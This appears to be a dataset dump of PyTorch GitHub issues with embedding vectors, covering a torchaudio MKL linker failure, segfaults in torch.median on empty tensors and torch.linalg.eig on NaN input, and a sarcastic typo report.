../../third_party/sox/../install/lib/libFLAC.a  ../../third_party/sox/../install/lib/libopusfile.a  ../../third_party/sox/../install/lib/libopus.a  ../../third_party/sox/../install/lib/libvorbisenc.a  ../../third_party/sox/../install/lib/libvorbisfile.a  ../../third_party/sox/../install/lib/libvorbis.a  ../../third_party/sox/../install/lib/libogg.a  ../../env/lib/python3.6/site-packages/torch/lib/libtorch.dylib  ../../env/lib/python3.6/site-packages/torch/lib/libtorch_cpu.dylib  ../../env/lib/python3.6/site-packages/torch/lib/libc10.dylib  -lmkl_intel_ilp64  -lmkl_core  -lmkl_intel_thread  ../../env/lib/python3.6/site-packages/torch/lib/libc10.dylib && :
FAILED: torchaudio/csrc/_torchaudio.so 
: && /Applications/Xcode-12.0.1.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/c++ -Wall  -O3 -DNDEBUG -isysroot /Applications/Xcode-12.0.1.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.15.sdk -dynamiclib -Wl,-headerpad_max_install_names -undefined dynamic_lookup -o torchaudio/csrc/_torchaudio.so -install_name @rpath/_torchaudio.so torchaudio/csrc/CMakeFiles/_torchaudio.dir/pybind.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/lfilter.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/overdrive.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/utils.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/cpu/compute_alphas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/cpu/compute_betas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/cpu/compute.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/compute_alphas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/compute_betas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/compute.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/autograd.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/kaldi.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/io.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/utils.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/effects.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/effects_chain.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/types.cpp.o  -Wl,-rpath,/Users/distiller/project/env/lib/python3.6/site-packages/torch/lib  ../../env/lib/python3.6/site-packages/torch/lib/libc10.dylib  ../../env/lib/python3.6/site-packages/torch/lib/libtorch_python.dylib  third_party/kaldi/libkaldi.a  ../../third_party/sox/../install/lib/libsox.a  ../../third_party/sox/../install/lib/libopencore-amrnb.a  ../../third_party/sox/../install/lib/libopencore-amrwb.a  ../../third_party/sox/../install/lib/libmad.a  ../../third_party/sox/../install/lib/libmp3lame.a  ../../third_party/sox/../install/lib/libFLAC.a  ../../third_party/sox/../install/lib/libopusfile.a  ../../third_party/sox/../install/lib/libopus.a  ../../third_party/sox/../install/lib/libvorbisenc.a  ../../third_party/sox/../install/lib/libvorbisfile.a  ../../third_party/sox/../install/lib/libvorbis.a  ../../third_party/sox/../install/lib/libogg.a  ../../env/lib/python3.6/site-packages/torch/lib/libtorch.dylib  ../../env/lib/python3.6/site-packages/torch/lib/libtorch_cpu.dylib  ../../env/lib/python3.6/site-packages/torch/lib/libc10.dylib  -lmkl_intel_ilp64  -lmkl_core  -lmkl_intel_thread  ../../env/lib/python3.6/site-packages/torch/lib/libc10.dylib && :
ld: library not found for -lmkl_intel_ilp64
clang: error: linker command failed with exit code 1 (use -v to see invocation)
```


cc @malfet @seemethere @walterddr @albanD",True,"[-2.79493093e-01 -7.97748715e-02 -1.32710457e-01  2.52060443e-02
 -8.12715143e-02 -9.83051136e-02 -3.36102188e-01  2.93494523e-01
 -6.01001620e-01  2.88911089e-02 -5.38930818e-02 -3.01627159e-01
 -4.38230693e-01  1.25987023e-01 -9.74449515e-02 -7.61285350e-02
 -2.18332171e-01 -5.36416888e-01  9.04427841e-04 -1.28418922e-01
  2.42719382e-01  4.03515249e-02 -3.17263573e-01 -7.21650720e-02
  8.94982517e-02  2.55268693e-01 -1.62963197e-01 -7.85370320e-02
  9.98543054e-02  3.26659471e-01  1.39210105e-01  1.58142477e-01
  4.14026901e-02 -1.75639354e-02  4.88538206e-01 -1.09021543e-02
 -9.07206014e-02 -1.05337873e-01 -2.73113489e-01 -1.60043240e-01
  1.97706759e-01 -1.77654698e-02  1.75354425e-02  8.83765668e-02
 -6.27092570e-02 -9.61128622e-02 -7.20677823e-02  3.29736918e-02
 -4.37508821e-02 -2.25105405e-01 -1.68993492e-02 -2.27784477e-02
  1.49774283e-01  1.16045829e-02  1.39368713e-01 -2.50589371e-01
 -3.43437701e-01  4.70320642e-01  3.94562781e-01  3.22019123e-03
  5.47970295e-01  7.54144490e-02  2.79519558e-02 -2.12527275e-01
  1.02071807e-01  3.74525115e-02 -9.80352163e-02 -1.25528440e-01
  5.06222069e-01  6.70826659e-02 -1.04283698e-01 -1.17567345e-01
  4.56695147e-02 -2.37960234e-01  8.36275965e-02  3.34933072e-01
 -2.81108201e-01 -9.11998153e-02 -1.99392140e-01 -2.96097815e-01
  2.45178305e-02 -1.27180442e-01 -9.73192304e-02  1.36790723e-01
  1.29494369e-01  4.42111418e-02  1.51904047e-01 -2.97104657e-01
  8.74073878e-02  1.14436701e-01  1.73919469e-01 -6.95148334e-02
  2.26292387e-01  2.08924964e-01 -1.77338064e-01  1.69595554e-02
  3.10516544e-02  1.36061788e-01 -3.93888056e-01 -1.33700401e-01
  1.07746171e-02 -2.66833425e-01 -2.20147401e-01  3.86391342e-01
 -4.94503006e-02 -5.07020831e-01  5.25010467e-01  1.37828588e-01
  2.31858268e-02  2.28562020e-02  4.00654733e-01  5.01626916e-03
 -1.33753270e-01  6.17705733e-02  3.25451553e-01  1.09141037e-01
 -2.74201512e-01 -2.33751044e-01 -1.55648842e-01  3.56120348e-01
  3.98651287e-02  1.58040822e-01 -1.05583042e-01  5.22717424e-02
  9.41623151e-02  5.44733182e-03  1.66771829e-01  4.24513444e-02
 -7.60091990e-02  2.15089824e-02 -1.25758141e-01  1.89150423e-01
  2.67866433e-01 -2.80820876e-01  1.63975969e-01  5.80595791e-01
 -5.36214747e-02 -1.10163011e-01 -1.08128846e-01 -2.21099947e-02
  7.22077638e-02  3.78696561e-01 -2.04315811e-01 -1.57827064e-01
  4.67887461e-01 -3.33706260e-01 -1.81602880e-01 -8.50084722e-02
  1.80319935e-01 -2.49307349e-01  1.51391134e-01 -3.25740248e-01
 -2.29545251e-01  4.51572061e-01  2.09572241e-01  3.00228409e-02
  3.06166947e-01  1.28302991e-01 -3.49833257e-03 -3.80860060e-01
  3.68445635e-01  2.56248951e-01  1.10096551e-01  2.86025912e-01
  1.87521532e-01 -1.51777536e-01 -3.67890239e-01 -1.12440996e-01
 -4.25063819e-01  2.88542211e-01 -2.74389386e-01 -2.94358134e-01
  1.05228513e-01 -1.16823830e-01 -1.11936577e-01 -3.48915219e-01
  2.23111302e-01 -4.37627882e-02  6.11453354e-02  2.11449742e-01
  1.59577042e-01  5.99971175e-01  5.68466723e-01  7.38586336e-02
 -3.88045348e-02  2.70554245e-01  1.91695452e-01 -1.18753463e-01
 -2.07480676e-02  4.95767184e-02 -5.21574855e-01  9.95520875e-03
  6.58308044e-02  1.60430223e-01 -2.09782738e-02  1.63536876e-01
  1.22833885e-01 -2.01791629e-01 -1.65355474e-01  1.19699866e-01
 -1.58477038e-01  8.49687904e-02 -7.76959956e-02 -1.70955151e-01
 -7.10193664e-02 -3.99002582e-02 -4.27939355e-01 -7.87323266e-02
 -7.58153349e-02 -8.69201571e-02  2.50794664e-02 -1.79650187e-01
 -9.96103138e-02 -5.39754555e-02  1.09816931e-01  3.11374903e-01
 -6.31401837e-02  1.76811844e-01 -2.58032441e-01  2.20096961e-01
  3.38235945e-01 -5.07337078e-02 -5.81132993e-02 -1.75005466e-01
  2.03753382e-01  4.19142283e-03  9.75932851e-02 -3.72868210e-01
  1.37122069e-03  1.57810599e-01 -1.19583040e-01 -2.19095320e-01
  2.34594166e-01 -1.90121755e-01  2.15926081e-01  1.48184821e-01
 -4.71206456e-02 -3.66616935e-01 -2.61139512e-01 -2.29490817e-01
 -2.20026404e-01 -3.10986847e-01  2.51759022e-01 -1.43572688e-01
  1.15520917e-02  3.11565902e-02 -2.88589895e-01  1.74239904e-01
 -1.09718353e-01 -1.10357493e-01  1.86665088e-01 -2.11088523e-01
 -3.46432209e-01  6.82931095e-02  3.26605402e-02  2.30113551e-01
  2.46729851e-01  2.26705559e-02 -1.17893651e-01  2.06432715e-01
  4.82971072e-02  4.64812368e-01 -3.67459059e-02  3.95981967e-02
  3.60121548e-01  2.06824586e-01  1.57514084e-02 -6.26657009e-02
 -1.81997150e-01  8.08707997e-03  1.12643480e-01 -4.28064853e-01
  3.23064268e-01  1.24398414e-02  4.59891081e-01 -2.29103714e-01
  1.02847531e-01 -2.22218037e-03  1.06198536e-02  1.27897233e-01
  1.24766365e-01  3.50444943e-01 -1.68424681e-01  2.82954834e-02
  4.09216106e-01 -4.30673838e-01 -4.47471142e-02 -4.19548213e-01
  1.14602089e-01 -2.89609849e-01 -1.25813186e-01 -9.32451040e-02
  6.28625154e-01  8.93352479e-02 -7.80282766e-02  1.04792766e-01
 -3.36184315e-02  7.76419118e-02 -6.66946620e-02  3.43200713e-02
 -4.82321441e-01  2.80187912e-02  2.39075888e-02 -9.00869519e-02
 -2.27228850e-01 -8.08890909e-03 -1.94708228e-01  3.03975701e-01
  7.36913681e-01 -1.15175694e-01  4.87603366e-01  1.08820155e-01
 -3.79755907e-03  4.47396964e-01 -8.53650179e-03  1.31228164e-01
 -2.21867129e-01  1.89801425e-01 -7.86192119e-02  8.09471309e-02
  1.34650782e-01 -2.41125762e-01 -5.80094099e-01  2.84952112e-02
  2.69869477e-01 -9.10661928e-03 -3.74377429e-01 -1.17498413e-01
  1.44665781e-02 -3.02519947e-02  2.48892158e-01  1.25984386e-01
 -4.32965979e-02  4.13629711e-01 -7.74168819e-02 -1.53165221e-01
 -6.98038843e-04  1.43265575e-01  3.76969315e-02 -6.65685713e-01
 -1.88173741e-01 -3.21621567e-01  1.30202457e-01 -2.16421068e-01
 -2.17657685e-01 -2.21309409e-01  2.51617432e-01  2.73733675e-01
 -3.16792339e-01  4.37106267e-02 -3.11048567e-01  6.68223947e-02
 -1.95507091e-02 -1.09971568e-01 -5.15380800e-02  3.48389030e-01
  9.57883298e-02  2.38988280e-01  8.91408324e-02  7.76144266e-02
 -1.40388787e-01  7.03120604e-02 -4.30192292e-01 -1.48858294e-01
  6.84312433e-02  8.40272009e-02 -7.52786919e-02  2.91281700e-01
 -1.18391931e-01  2.59943664e-01 -3.26241314e-01  1.75625205e-01
 -1.15574747e-01  1.41217113e-02  4.86987859e-01 -2.87497610e-01
  8.85795355e-02 -1.66059732e-01 -9.02782232e-02 -2.99292840e-02
  1.95692867e-01  6.62787184e-02 -6.38715625e-02  2.48452425e-02]"
`torch.median` on empty tensor causes segfault high priority triage review module: crash triaged module: reductions,"## ðŸ› Bug

Calling `torch.median()` on an empty tensor causes segfault.

## To Reproduce

```python
import torch
t = torch.tensor([])
t.median()
```

## Expected behavior

Similar to other ops like `torch.mean()` or `torch.sum()` - attempting to find median of an empty tensor should cause a `RuntimeError` or otherwise produce a stack trace, rather than causing segfault.

## Environment

```shell
Collecting environment information...
PyTorch version: 1.9.0+cu102
Is debug build: False
CUDA used to build PyTorch: 10.2
ROCM used to build PyTorch: N/A

OS: Ubuntu 20.04.2 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
Clang version: Could not collect
CMake version: Could not collect
Libc version: glibc-2.31

Python version: 3.8.5 (default, May 27 2021, 13:30:53)  [GCC 9.3.0] (64-bit runtime)
Python platform: Linux-5.8.0-53-generic-x86_64-with-glibc2.29
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration: GPU 0: GeForce GTX TITAN X
Nvidia driver version: 460.32.03
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.21.0
[pip3] pytorch-lightning==1.3.8
[pip3] torch==1.9.0
[pip3] torch-tb-profiler==0.2.1
[pip3] torchmetrics==0.4.1
[pip3] torchvision==0.10.0
[conda] Could not collect
```


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @heitorschueroff",True,"[-0.20118308 -0.5209348  -0.11865277  0.02694583  0.30171707 -0.3064981
  0.10179599  0.30819577 -0.21003291 -0.3544642  -0.05720767  0.36319247
 -0.18685718  0.31891197 -0.3371352  -0.1300827  -0.2919839  -0.4568936
 -0.12751025 -0.06554347  0.30864906 -0.14339814 -0.03462903  0.08073816
 -0.24493977  0.03412344  0.09638947 -0.22583628  0.50429094  0.1561781
  0.09094195 -0.00331876 -0.19639999 -0.08567412  0.14629951  0.12834506
 -0.12199328 -0.02794732 -0.28372222  0.01842029  0.26523528 -0.17075263
  0.05397632  0.17012067 -0.17586944  0.07404696  0.22381625 -0.06036713
 -0.14827508  0.09423651 -0.14844164  0.25090116 -0.2054898  -0.25353473
  0.10990028 -0.11203523  0.00572325 -0.1714859   0.16548693 -0.35540068
 -0.24236682  0.28322032 -0.24311161 -0.0260582   0.4351588   0.09380288
  0.15654862  0.13770555  0.4528674   0.3563081   0.24536404 -0.01816903
 -0.00575879  0.17370135 -0.05489147  0.11056614 -0.31269336  0.3430896
  0.07825737 -0.40857723 -0.03233946 -0.01212932  0.08083414 -0.02409716
  0.22547257 -0.09816161  0.23711741  0.0651907   0.51925135  0.20075712
  0.19348699 -0.05204145 -0.24741969  0.12736537 -0.1085401   0.25820282
  0.37028342  0.06947635  0.14989819 -0.01208717 -0.38983542 -0.24832898
 -0.3059102   0.22777773  0.14474279  0.1888656   0.05567504  0.1825018
 -0.0458294  -0.05216535  0.33502185  0.00340451  0.48527032  0.11671288
  0.01368654 -0.22614436  0.06884996  0.19605702 -0.05231563  0.12596986
 -0.12100174  0.17720377  0.06381299  0.30869305  0.2661857   0.10861555
 -0.18065858  0.12315958  0.08468156 -0.12177979  0.02204489 -0.29133728
 -0.21333495  0.01773381  0.0469844   0.10744251 -0.05651709  0.09065349
 -0.1851251   0.10827769  0.05943032 -0.4071617  -0.05564611 -0.22750476
  0.37379652 -0.05128662 -0.43153095 -0.04188333  0.02495322  0.08403304
 -0.1969494  -0.04248562 -0.43153033 -0.03265059 -0.22460653  0.04835657
  0.03848124  0.03655896  0.04917211 -0.08382594  0.01539935  0.26966727
  0.09333076  0.02111394  0.28568274  0.15480873 -0.25748903 -0.1566377
 -0.4921716   0.0611069   0.30149975 -0.30328995 -0.46109474 -0.17419039
  0.28786594 -0.0769659  -0.07253964 -0.5183551  -0.2682076   0.03723145
  0.6719194   0.04089183  0.06902799  0.27595723 -0.02776334 -0.28346232
  0.10302451 -0.15557837 -0.10699792 -0.10089324 -0.16452526 -0.23966736
  0.22830185  0.02619239  0.09658006  0.1392876   0.15353814 -0.15004623
  0.2595641   0.03414342  0.05029831 -0.26058915 -0.08988206  0.00282398
  0.3183489  -0.08562821 -0.21922487 -0.6032807  -0.20196764 -0.11841848
 -0.10877712 -0.5180379   0.14298013  0.00643076 -0.14223728 -0.12637462
 -0.2804817  -0.19085678 -0.2203889   0.09154932  0.03463292  0.29272687
 -0.3385486  -0.27115864 -0.05911656  0.20028426 -0.02567329 -0.12806061
 -0.18890819  0.2876386   0.18676974 -0.22616808  0.09453049  0.13690642
  0.05752342  0.16790985 -0.22377008 -0.09957887  0.01145124  0.06547061
 -0.18890049  0.10890143 -0.20493817  0.01707523 -0.29831886  0.28693193
 -0.1927385   0.13494298 -0.27938884  0.07948267 -0.16855463  0.5964196
 -0.41041484  0.09267143  0.37490195 -0.18472064  0.07378182  0.02361727
  0.05921493 -0.06364824  0.24468988 -0.13503787 -0.00381903  0.52298033
  0.1254432   0.13084505  0.19688018  0.59089905  0.16575333 -0.01549634
 -0.2251042   0.0241776   0.5247022  -0.17232618 -0.05965481  0.03818972
  0.34422678  0.38773435 -0.13419858 -0.14997952  0.13181686  0.5209761
 -0.49609214  0.28844273  0.19619887 -0.2578498  -0.21822657 -0.07291631
 -0.02071185 -0.14579946 -0.20738727 -0.33620238  0.44125605 -0.14697391
 -0.17597811  0.22997665  0.2065572  -0.30689317  0.00383498 -0.0040312
  0.18172151  0.15959933  0.11252388 -0.03000426 -0.17083526 -0.19047134
  0.33261144  0.10448094  0.04038923 -0.4573723   0.15308246 -0.07847052
  0.06198953  0.19136584 -0.17092244  0.13507828 -0.1103131   0.4440738
  0.3700355   0.02286728 -0.17145531 -0.16048187 -0.16772592  0.05458684
  0.18808526 -0.15372789 -0.15382487  0.11022258 -0.2847687   0.03983878
 -0.03384794 -0.20410585 -0.00310692  0.11882469 -0.08184243 -0.34562606
 -0.13560703  0.34900233 -0.2295822  -0.31225306 -0.27722532 -0.3576258
 -0.09395976  0.01022702  0.04613154 -0.2445795   0.27025735  0.04231179
 -0.09531689 -0.23684251 -0.17795512  0.04995805 -0.00617451  0.33263224
 -0.01935991  0.54173195  0.07873949  0.07799786 -0.0882525   0.5064207
 -0.07830019  0.06318296 -0.3674299  -0.07342249 -0.09468387  0.03700165
 -0.26356897  0.1345129   0.3604741   0.304454    0.15518889  0.2864453
 -0.13065784  0.33556613  0.3646414  -0.38927025 -0.1468646   0.20566054
  0.1598393  -0.00572727  0.31739074  0.2939154  -0.17406332 -0.04976869]"
"no ""arugment"" triaged","I found a bug [here](https://github.com/pytorch/pytorch/blob/20085f6d2364c4acf526f4eb303b8623207f0d48/aten/src/ATen/core/adaption.cpp#L10), where it says ""arugment"" instead of ""argument"".

This severely hinders the use of PyTorch and must be fixed ASAP!! It broke our high availability production system. We already lost multiple big enterprise customers because of you! For sure there are many more people complaining about this tremendous bug. For such a pricey product I expect much better QC. This is unaccpetable!!!
/s",True,"[-5.55749893e-01 -1.11626871e-01 -3.42853248e-01  2.23041773e-01
  6.72691911e-02 -3.24201852e-01  1.40328869e-01  8.58313497e-03
 -7.98341185e-02 -1.52917087e-01  1.77561298e-01  9.34274867e-02
 -2.40272358e-02 -1.43982738e-01 -4.39041555e-02  1.34381920e-01
 -1.79616526e-01 -1.74657911e-01 -5.62891550e-02 -8.24901015e-02
 -9.15149450e-02  1.50658697e-01 -1.57368705e-01  4.12166826e-02
 -1.29303366e-01  1.85281008e-01  1.24376966e-02 -3.80579770e-01
 -1.96489781e-01  2.64033586e-01  3.47566247e-01  1.48183405e-01
  6.37003779e-02 -1.68378964e-01  9.06748399e-02 -1.43593386e-01
 -2.08147988e-01 -2.44815480e-02  2.87557572e-01 -1.93355799e-01
 -4.48476225e-02  1.78164661e-01  1.37670115e-02 -7.53285736e-02
 -3.05469424e-01  2.33995933e-02 -8.67316127e-02  4.35598120e-02
 -7.12294132e-02 -2.24919617e-01  3.88880111e-02  1.32757425e-01
 -2.49990970e-01 -1.67342991e-01  1.00334622e-01 -9.40122083e-02
  1.49048530e-02  1.94673762e-01  2.94191968e-02  3.23384643e-01
  2.56407201e-01 -4.11210209e-02  2.73880243e-01  1.39107555e-01
  1.97662432e-02  1.47729721e-02 -2.86562722e-02 -1.16627470e-01
  2.59621769e-01 -7.50678182e-02 -1.24252513e-01 -2.36111842e-02
 -3.80820423e-01 -1.36069525e-02  2.73411512e-01  1.95439026e-01
 -4.18816149e-01  1.58707172e-01  1.52913988e-01 -1.29906863e-01
 -1.04365215e-01 -3.36206079e-01  4.11770716e-02 -1.89351648e-01
 -4.93947715e-02 -3.08645591e-02 -5.49321771e-02  1.21212706e-01
  3.12808990e-01 -9.31503922e-02  5.05268455e-01  6.38199598e-02
  9.71060693e-02  3.01071107e-01  1.08835883e-01  3.29775587e-02
 -1.32115811e-01 -1.05246335e-01 -2.90819108e-01 -9.98359323e-02
 -3.43302637e-01 -1.42256320e-01 -3.86144668e-01  1.20296329e-03
 -1.20376401e-01 -2.58947581e-01  1.40625358e-01  1.96184874e-01
  3.36686254e-01  4.23855260e-02  2.41569337e-03 -1.34050161e-01
  1.84257165e-01  9.71639082e-02  1.44569334e-02  1.64741412e-01
  1.20276324e-01 -1.40980452e-01 -3.05320919e-01  7.38108307e-02
 -4.92085516e-02  5.48225455e-03 -2.15912998e-01  3.22040617e-01
 -3.37373279e-02 -4.33082581e-02 -1.08769670e-01  2.00609982e-01
 -6.52166605e-02  8.99527594e-02  1.04336128e-01 -3.41030769e-02
  6.93006516e-02 -1.20670140e-01  4.78024036e-02 -2.82817364e-01
  9.42697674e-02 -3.53723615e-01  1.80667296e-01 -6.61064759e-02
 -8.58682692e-02  6.44185916e-02  2.78290272e-01 -3.67791593e-01
 -2.66277969e-01  1.24236472e-01  1.09770462e-01 -5.00948206e-02
  2.72822306e-02  1.57324091e-01 -8.03644136e-02  1.07924290e-01
 -3.62606049e-01  8.70976925e-01 -4.84002680e-02  1.10768184e-01
  1.90748870e-01 -1.24425709e-01  2.33666360e-01 -2.53129601e-01
 -2.80672647e-02  1.55941844e-01  2.69571781e-01 -1.13491558e-01
  1.35159180e-01 -1.59760281e-01 -4.43874270e-01 -2.43868575e-01
 -3.76342461e-02 -6.27787504e-03 -2.44339719e-01  3.61038566e-01
  2.94619560e-01 -3.51395994e-01 -7.28428513e-02  9.51467752e-02
  6.63436949e-02  2.47652568e-02 -5.58636189e-02  3.83509308e-01
  7.03639016e-02  2.57705122e-01  1.23576269e-01  4.27996740e-02
  1.75002553e-02  2.02413961e-01  1.44798085e-02  6.61607385e-02
 -1.01658173e-01 -1.72787998e-02 -1.31520228e-02  6.53146654e-02
 -1.45090193e-01 -1.77462861e-01 -1.50495946e-01  1.30863488e-01
 -7.72518218e-02  1.61403894e-01  3.02736938e-01 -1.11062266e-01
  1.90953776e-01  9.97434855e-02  5.14264107e-02 -6.87010437e-02
  1.63940728e-01  1.47421993e-02 -1.88266397e-01 -3.89180392e-01
 -1.11164346e-01 -4.19033282e-02  8.72772783e-02 -2.80702680e-01
 -1.89553916e-01 -3.23500574e-01 -3.04958463e-01  2.85538316e-01
  3.33260626e-01  3.19555104e-01  5.72060421e-02  3.70317161e-01
  3.38566937e-02 -4.12002625e-03  3.69461700e-02 -2.96259999e-01
  7.79157281e-02 -7.67870992e-02 -1.86525732e-01 -3.29769440e-02
  1.07661095e-02  7.76811242e-02 -2.81929612e-01 -3.55098695e-01
  2.78904498e-01  1.02417231e-01  1.12882480e-01  9.77011621e-02
 -1.56544238e-01  1.44482777e-01  2.53581703e-01  1.22864068e-01
  7.09857941e-02 -1.87353536e-01 -2.50409514e-01 -5.55505082e-02
 -8.90484750e-02 -2.36516632e-02 -1.40337169e-01  1.13776967e-01
 -1.49589241e-01  6.19720705e-02 -1.10218689e-01 -1.17064103e-01
  3.50608528e-01  2.62428164e-01  1.49812788e-01 -2.83008404e-02
  8.91139507e-02  7.95799717e-02  3.91527601e-02 -1.20579399e-01
  3.03714752e-01  6.42333180e-04 -2.45716244e-01  8.08933750e-02
  9.83919427e-02 -1.65299743e-01 -5.05312204e-01  1.87273733e-02
 -2.49588728e-01  5.73884416e-03  4.33288842e-01 -3.10299993e-01
  1.14637613e-01 -4.45308238e-02  5.65569162e-01 -2.54180551e-01
  4.18499470e-01 -1.72141761e-01 -1.13564923e-01  9.65618640e-02
  2.31195614e-01 -2.83980519e-02  5.46363518e-02 -2.67760921e-02
  2.71282077e-01 -1.26925707e-01  8.00100490e-02 -4.42798346e-01
 -2.94056714e-01 -7.87746310e-02 -2.19594631e-02  3.91238034e-01
  3.02218974e-01 -2.14078277e-01  2.97217667e-01  1.06727267e-02
 -1.05347469e-01 -1.62350200e-03  3.08603853e-01  1.60398245e-01
 -1.58758312e-01 -1.41611189e-01 -2.35123143e-01 -8.38997215e-02
 -9.94919538e-02  3.04673195e-01 -2.26160884e-01 -1.45138413e-01
  3.03788483e-01 -4.07588661e-01 -2.08931249e-02  2.13448927e-01
  2.02501714e-01  3.73011768e-01 -2.06597596e-01  2.71177553e-02
 -1.99949786e-01  4.99312699e-01  1.16146915e-01  2.14139611e-01
 -8.27130675e-02 -7.00699762e-02 -2.84477860e-01  2.60928392e-01
  2.28458360e-01  1.66524231e-01 -1.56115860e-01 -7.08861798e-02
 -1.70691580e-01 -1.02520056e-01 -7.77630359e-02  1.80992723e-01
  7.25100636e-02  2.19550639e-01  1.61366954e-01  1.31566331e-01
 -1.76879227e-01 -1.23155601e-01 -2.90533639e-02 -2.17463672e-01
 -3.44448119e-01  6.58958703e-02  2.66173273e-01 -2.64379919e-01
 -4.75491583e-02 -6.01890795e-02  1.82723895e-01  4.52491164e-01
 -1.76493585e-01  1.37929723e-01 -7.03392327e-02  2.77368426e-01
 -1.39142536e-02  3.33937351e-03 -1.86787918e-01  1.90352499e-01
 -1.14584155e-01  4.01206076e-01  2.28037864e-01  2.44283199e-01
 -5.57462156e-01  4.87144552e-02 -2.84026146e-01  2.82840759e-01
 -8.73881727e-02 -1.47643745e-01 -3.48483413e-01  9.85635146e-02
 -5.53450063e-02  3.30433190e-01 -2.32221574e-01  1.35398358e-01
 -3.27426136e-01 -1.07563706e-02  1.07298262e-01 -1.86524123e-01
  1.28682241e-01 -1.24744534e-01 -2.20163614e-01 -2.04288572e-01
 -9.13479105e-02  1.97759360e-01  1.28026903e-01  1.38728246e-01]"
torch.linalg.eig() doesn't handle NaNs high priority module: crash triaged module: NaNs and Infs module: mkl module: linear algebra module: intel,"## ðŸ› Bug
This is a followup to https://github.com/pytorch/pytorch/issues/37499. As it was decided to handle NaNs in `x.eig()` for a tensor `x` there, I suppose they should also be handled for `torch.linalg.eig(x)`.

### To reproduce
```
import torch
import numpy as np
A = np.nan * torch.ones((3,3))
torch.linalg.eig(A)
```
This currently gives:
```
Intel MKL ERROR: Parameter 3 was incorrect on entry to SGEBAL.
Process finished with exit code 139 (interrupted by signal 11: SIGSEGV)
```
### Environment
 - PyTorch Version: 1.9.0+cu102
 - OS (e.g., Linux): Ubuntu 20.04
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Python version: 3.7.7
 - CUDA/cuDNN version: 10.2


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @IvanYashchuk @xwang233 @Lezcano",True,"[-3.44334275e-01 -1.36828780e-01 -1.59292459e-01 -1.16248190e-01
 -3.23418304e-02 -3.72307837e-01 -1.14757791e-02  9.15088728e-02
 -2.59881169e-01  4.37414832e-02  1.10831810e-02  2.27663919e-01
 -2.47468829e-01  1.95823804e-01  4.79821265e-02  3.94801013e-02
 -2.32725486e-01 -2.91443244e-02 -1.51972160e-01  5.91833554e-02
  2.55795538e-01 -1.92518875e-01 -1.63073972e-01 -1.22106291e-01
  3.26507650e-02  2.10911721e-01  2.83200085e-01 -1.54693007e-01
  8.38328749e-02 -1.53237179e-01 -7.98504874e-02  7.87400901e-02
 -4.48142231e-01 -1.41313881e-01 -1.12401493e-01  2.27958441e-01
 -6.78513050e-02 -4.18918788e-01 -2.32340842e-01 -1.96166322e-01
  8.17553028e-02  1.00273460e-01  1.35283560e-01 -5.49557284e-02
 -1.04273781e-01 -1.23134349e-02  1.14800066e-01  1.03544801e-01
 -2.20831901e-01 -1.66725844e-01 -2.28857011e-01 -1.89469755e-02
  2.76776813e-02  1.13537731e-02  2.16847569e-01 -2.88220048e-02
  1.40959918e-01 -2.11430907e-01  1.71925910e-02  5.88546358e-02
  1.31362360e-02  5.43848276e-02  1.11313440e-01  7.77537227e-02
  2.40143940e-01 -2.17709541e-02  1.80998817e-01 -2.97360599e-01
  1.72623634e-01 -3.78085822e-02  1.63383543e-01 -1.52675658e-01
 -3.87563407e-01  2.86288615e-02 -4.15297002e-02  1.65612563e-01
 -8.68116319e-02  2.18659595e-01  2.21524119e-01 -2.53456403e-02
 -9.68142152e-02  2.32753474e-02  7.85886496e-02 -3.54977369e-01
  2.38422275e-01  5.43891229e-02 -3.69385183e-02  1.65596664e-01
  3.68533432e-01  2.64690787e-01  2.99690336e-01  7.80536607e-02
  6.82171341e-03  1.73084646e-01  2.32285619e-01  9.88098308e-02
  3.84423494e-01 -9.10872668e-02 -3.47483635e-01 -2.31680885e-01
 -3.23888898e-01 -5.27510464e-01 -3.00718784e-01  1.24684632e-01
 -5.50342426e-02 -6.23006858e-02  2.54549623e-01  8.79922733e-02
 -8.17115791e-03 -1.06002390e-01  7.36507401e-02  1.38601959e-01
 -2.42738612e-02  2.63549536e-02 -8.16613510e-02  1.48796096e-01
 -6.15600348e-02 -2.10040748e-01  1.86305959e-03  2.18486488e-01
 -2.10596826e-02  1.27988249e-01  2.55176485e-01  4.69871640e-01
  2.46767610e-01  1.50629029e-01  1.89812109e-02  1.75445341e-03
 -8.03829655e-02 -3.60384956e-02  9.98099819e-02 -7.79143721e-02
 -8.01827759e-02  1.07026413e-01  3.18177253e-01  2.88310766e-01
 -3.19634020e-01 -2.16023833e-01 -3.85565400e-01  1.43187433e-01
 -1.46938115e-01  5.89678213e-02 -3.32736559e-02 -2.17525333e-01
  3.90017301e-01  9.09507573e-02  9.32872668e-03 -4.53251153e-02
 -6.85008615e-02  2.51042098e-02  1.24364994e-01 -1.96314696e-02
 -2.36476421e-01  2.77619064e-01  4.05031145e-02  1.31857187e-01
  1.00879431e-01  7.36611038e-02  3.44589591e-01 -3.80265445e-01
